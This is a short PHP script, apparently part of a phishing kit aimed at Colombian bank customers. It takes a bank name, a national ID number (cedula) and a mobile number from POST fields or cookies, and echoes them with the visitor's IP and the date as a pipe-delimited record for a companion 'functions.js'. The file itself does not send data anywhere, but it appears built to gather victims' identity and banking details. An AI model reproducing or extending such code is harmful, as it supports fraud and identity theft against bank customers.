<?php
date_default_timezone_set('America/Bogota');

// Capturar IP y fecha
$ip = $_SERVER['REMOTE_ADDR'];
$fecha = date("d-m-Y");

// Obtener datos del POST (que vienen del localStorage via JavaScript)
$nombrebanco = $_POST['nom'] ?? $_COOKIE['nombrebanco'] ?? 'No disponible';
$cedula = $_POST['val'] ?? $_COOKIE['cedula'] ?? 'No disponible';
$celular = $_POST['cel'] ?? $_COOKIE['celular'] ?? 'No disponible';

// Generar resumen en el formato que espera functions.js
// functions.js espera: res[0]=IP, res[1]=fecha, res[2]=banco, res[3]=cedula, res[4]=celular
$resumen = $ip . "|" . $fecha . "|" . $nombrebanco . "|" . $cedula . "|" . $celular;

echo $resumen;
?>